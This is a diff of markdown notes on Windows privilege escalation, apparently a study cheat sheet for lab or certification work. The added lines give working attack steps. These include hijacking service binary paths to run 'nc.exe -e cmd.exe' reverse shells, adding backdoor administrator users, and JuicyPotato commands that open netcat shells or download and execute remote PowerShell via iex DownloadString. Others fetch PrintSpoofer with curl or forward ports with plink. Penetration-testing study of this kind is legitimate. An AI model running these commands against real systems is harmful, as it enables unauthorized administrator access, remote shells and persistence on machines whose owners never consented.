@@ -516,7 +516,7 @@ you can use the below tools for complete coverage
 - Privesc   https://github.com/enjoiz/Privesc
 - winPEAS   https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
 
-# <span style="color:lightblue">AlwaysInstallElevated</span>
+# <span style="color:lightblue">Autorun</span>
 
 ## <span style="color:lightgreen">Methodology</span>
 
@@ -594,15 +594,16 @@ $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o p
 
 # AlwaysInstallElevated  is a type of Registry Escalation.
 
-This option is equivalent to granting full administrative rights, which can pose a massive security risk. Microsoft strongly discourages the use of this setting.
+run powerup and check if the AlwaysInstallElevated is there or not. if yes you can run the command that is in the powerup to add a new user to the administrator group (it will generate a program to add the user)
 
-To install a package with elevated (system) privileges, set the AlwaysInstallElevated value to "1" under both of the following registry keys:
+check AlwaysInstallElevated from the cmd. if the AlwaysInstallElevated has a value of 0x1 means it's on
 ```console
-HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
-
-HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 ```
-If the AlwaysInstallElevated value is not set to "1" under both of the preceding registry keys, the installer uses elevated privileges to install managed applications and uses the current user's privilege level for unmanaged applications.
+ then run the program that powerup generated to create a backdoor user and set the user to the administrator group
+another option is to use meterpreter to elevate your session
+-     exploit/windows/local/always_install_elevated
 
 ## <span style="color:lightgreen">Detection</span>
 ### Windows VM
@@ -729,6 +730,32 @@ C:\Temp> sc start regsvc
 
 1. Wait for a reverse shell on your kali machine.
 
+### Another approach using windows_service.c file
+
+1. Transfer the file from Windows to Kali. Use an FTP server to do that
+-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (run it on kali)
+2. head to C:\Tools\Source and connect to the kali FTP server, anonymous login, then put the windows_service.c file
+-     ftp 10.10.16.4 | username:anonymous | put windows_service.c
+edit the windows_service file and replace the system("whoami > ..") with system("cmd.exe /k net localgroup administrator user /add"). 
+3. compile the C file
+-     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
+4. move the compiled c file to Windows then run it using
+-     reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc  /v ImagePath /t REG_EXPAND_SZ /d c:\temp\raman.exe /f
+-     sc start regsvc
+5. net localgroup administrator
+
+### you can use the above approach by generating a reverse shell instead of adding a user
+1. Transfer the file from Windows to Kali. Use an FTP server to do that
+-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (run it on kali)
+2. head to C:\Tools\Source and connect to the kali FTP server, anonymous login, then put the windows_service.c file
+-     ftp 10.10.16.4 | username:anonymous | put windows_service.c
+3. edit the windows_service file and replace the system("whoami > ..") with system("nc.exe -e cmd.exe <Attacker_IP> <PORT>").
+4. compile the C file
+-     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
+5. move the compiled c file to Windows then run it using
+-     reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc  /v ImagePath /t REG_EXPAND_SZ /d c:\temp\raman.exe /f
+-     sc start regsvc 
+
 
 # <span style="color:lightblue">Executable Files</span>
 
@@ -778,6 +805,19 @@ C:\Temp> sc start filepermsvc
 
 1. Wait for a reverse shell on your kali machine.
 
+### Another approach using windows_service.c file
+
+1. Transfer the file from Windows to Kali. Use an FTP server to do that
+-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (run it on kali)
+2. head to C:\Tools\Source and connect to the kali FTP server, anonymous login, then put the windows_service.c file
+-     ftp 10.10.16.4 | username:anonymous | put windows_service.c
+3. edit the windows_service file and replace the system("whoami > ..") with system("nc.exe -e cmd.exe <Attacker_IP> <PORT>").
+4. compile the C file
+-     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
+5. move the compiled c file to Windows then run it using
+-     reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc  /v ImagePath /t REG_EXPAND_SZ /d c:\temp\raman.exe /f
+-     sc start regsvc 
+
 # <span style="color:lightblue">Startup Applications</span>
 
 ## <span style="color:lightgreen">Methodology</span>
@@ -825,9 +865,47 @@ $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53  -f exe -o 
 
 1. Wait for a reverse shell on your kali machine.
 
+# <span style="color:lightblue">Port Forwarding</span>
+
+## <span style="color:lightgreen">Methodology</span>
+you need to check the local open ports in the windows machine that you didn't get from the nmap scan. local service might be running in windows machine
+## <span style="color:lightgreen">Detection</span>
+check the open ports in the machine using `"netstate -ano"`. assume port 445 is locally opened so you need to check what is there. use `"plink.exe"` for port forwarding
+## <span style="color:lightgreen">Exploitation</span>
+
+1.  install ssh and edit the config file (kali)
+-     apt install ssh && nano /etc/ssh/sshd_config
+2.  change #PermitRootLogin line in the sshd_config file to the following
+```
+PermitRootLogin yes
+service ssh restart && service ssh enable
+```
+3.  from the Windows machine
+-     plink.exe -l <KaliUser> -pw <KaliPasswd> -R <ServicePort in Windows>:127.0.0.1:<KaliPort> <KaliIP>
+4.  now you need to use winexe tool to execute a command in Windows
+-     winexe -U Administrator%<Password that you found in the registry> //127.0.0.1 "cmd.exe"
+
+# <span style="color:lightblue">Windows Subsystem for Linux</span>
+
+## <span style="color:lightgreen">Methodology</span>
+you can think about it as VM in Windows machine. if besh.exe and wsl.exe are installed you are good to go
+
+## <span style="color:lightgreen">Detection</span>
+check if bash.exe and wsl.exe are installed
+-     where /R c:\windows bash.exe
+
+## <span style="color:lightgreen">Exploitation</span>
+run either bash.exe or wsl.exe to get a shell then use python tty escape to get a shell
+```
+C:\>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+now you are running linux machine. you can use linux commands and continue enumeration
+
 # <span style="color:lightblue">DLL Hijacking</span>
 
 ## <span style="color:lightgreen">Methodology</span>
+Check DLL Hijacking from hacktricks FYR.
 Windows applications usually load DLL files when started. It may happen that a DLL file does not exist and the application is unable to load it. Nevertheless, an application will continue to execute as long as the missing DLL is not needed.  
 In case the application uses a relative and not an absolute file path, Windows searches for the file in the following directories:
 
@@ -841,10 +919,10 @@ In case the application uses a relative and not an absolute file path, Windows s
 
 ### Steps taken to perform DLL hijacking are outlined below.
 
-1.  Identify vulnerable application and location
+1.  Identify vulnerable application and location  #run winPEAS to check if you have write permission in any folder
 2.  Identify applications PID
 3.  Identify vulnerable DLLs that can be hijacked
-4.  Use MSFVenom or other payload creation tools to create a malicious DLL
+4.  Use MSFVenom or other payload creation tools to create a malicious DLL 
 5.  Replace the original DLL with the malicious DLL
 6.  Profit
 
@@ -888,6 +966,9 @@ $ sudo nc -nvlp 53
 2. Open an additional command prompt and type: 
 ```console
 $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f dll -o hijackme.dll
+#OR
+$ https://github.com/sagishahar/scripts/blob/master/windows_dll.c
+
 ```
 
 3. Copy the generated file `hijackme.dll`, to the Windows VM.
@@ -923,7 +1004,7 @@ PS C:\Temp>. .\PowerUp.sp1
 PS C:\Temp> Invoke-AllChecks
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/aff13a5b-82aa-486b-b7ed-8b23ca523762)
-
+continue enumeration to check if you can change the path of the service
 
 ### Checking manually on Windows VM
 
@@ -940,14 +1021,14 @@ C:\Temp> accesschk64.exe -uwcv Everyone *
 # Everyone --> means everyone as a group who hass access
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/732f0827-ca4d-4abe-8c76-bd679036255a)
-
+we get the service name again
 
 2. Using [AccessChk64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) query the service found
 ```console
 C:\Temp> accesschk64.exe -uwcv daclsvc
 ```
 ![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/385c8683-a242-4417-bfbc-9414e6dbd5a6)
-
+if you check we have RW Everyone. means you can change the path of the running service
 
 3. Find path of the bin file
 ```console
@@ -987,6 +1068,8 @@ C:\Temp> sc start daclsvc
 
 1. Wait for a reverse shell on your kali machine.
 
+### If you can't transfer the payload to windows (AV is blocking) use the following exploit in the BinPath
+-     sc config <Service> binpath="C:\Users\mssql-svc\Desktop\nc.exe 10.10.16.14 9004 -e cmd.exe"
 # <span style="color:lightblue">Unquoted Service Paths</span>
 
 ## <span style="color:lightgreen">Methodology</span>
@@ -1079,22 +1162,35 @@ $ sudo rlwrap nc -lnvp 9999
 
 ### Windows VM
 
-1. Run juicy potato
-```console
-$ ./jp.exe -p shell.bat -l 7777 -t *
-```
-+ If this fail
-+ Try with a different CLSID depending upon the system version and select the CLSID which supports NT AUTHORITY\SYSTEM
++ Use CLSID depending upon the system version and select the CLSID which supports NT AUTHORITY\SYSTEM
 + Link --> [http://ohpe.it/juicy-potato/CLSID](http://ohpe.it/juicy-potato/CLSID)
 
-2. Lets run again
+2. run juicy potato
 ```console
 $ ./jp.exe -p shell.bat -l 7777 -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
+#OR
+JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
+#OR
+juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID of your windows machine}
+#OR
+.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```
 
 ### Kali VM
 
 1. Wait for a reverse shell on your kali machine.
+
+### Use Juicy Potato by setting up your SMB server if the antivirus is on
+```
+impacket-smbserver raman `pwd` #set up SMB server
+cmd /c "\\10.10.16.3\raman\juicypotato.exe -l 1337 -p \\10.10.16.3\raman\reverse.exe -t * -c {CLSID of your windows machine}"
+```
+
+### JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809. use PrintSpoofer instead.
+```
+curl 192.168.10.10/PrintSpoofer64.exe -o Pr.exe
+.\Pr.exe -i -c cmd  OR .\PrintSpoofer32.exe -i -c powershell.exe
+```
 
 # <span style="color:lightblue">Hot Potato attack</span>
 
